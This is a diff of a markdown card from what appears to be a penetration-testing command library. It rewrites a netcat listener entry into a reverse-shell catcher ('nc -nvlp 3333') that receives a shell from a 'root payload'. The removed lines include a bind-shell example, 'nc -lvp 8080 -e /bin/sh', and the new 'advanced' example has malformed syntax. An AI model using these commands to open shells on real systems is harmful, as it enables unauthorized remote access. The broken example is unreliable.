@@ -1,16 +1,16 @@
 ---
-data: nc -lvp 8080
+data: nc -nvlp 3333
 tags:
-  - listener
-  - network
+  - listen
+  - reverse-shell
 type: command
+output: 'listening on [any] 3333 ... connect to [127.0.0.1] from ...'
 executor: bash
 platforms:
   - Linux
-  - Unix
-id: 9b88bc73-6f18-4465-a364-967538e565fc
-created_at: '2025-12-14T04:39:09.915Z'
-updated_at: '2025-12-14T04:39:09.915Z'
+created_at: '2023-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:29:56.967Z'
+id: d9d24257-eadc-45a1-821a-22f29377b4c3
 verified: false
 validated: true
 submitted: true
@@ -20,40 +20,41 @@ submitted: true
 ## Command
 
 ```bash
-nc -lvp 8080
+nc -nvlp 3333
 ```
 
 ## Description
 
-This netcat command sets up a TCP listener on port 8080 to capture incoming connections, commonly used in SSRF testing to receive server-side requests. It displays verbose output for easy analysis.
+Starts netcat in listen mode on localhost port 3333 to receive the reverse shell from the root payload.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-l` | Listen mode | Yes |
-| `-v` | Verbose output | Yes |
-| `-p 8080` | Specify port | Yes |
+| -n | No DNS resolution | Yes |
+| -v | Verbose output | Yes |
+| -l | Listen mode | Yes |
+| -p 3333 | Port to bind | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-nc -lvp 8080
+nc -nvlp 3333
 ```
 
 ### Advanced Usage
 
 ```bash
-nc -lvp 8080 -e /bin/sh
+nc -nvlp 0.0.0.0 4444
 ```
-(Enables shell on connect, for interactive exploitation)
 
 ## Expected Output
 
-"Listening on [0.0.0.0] (family 0, port 8080)" followed by connection details and raw data on receive.
+'listening on [any] 3333 ... connect to [127.0.0.1] from (localhost)'
 
 ## Related
 
-- [[Related Procedure|procedures/Set-Up-Attacker-Listener]]
+- [[commands/echo-deploy-payload]]
+- [[procedures/Deploy-Reverse-Shell-Payload]]
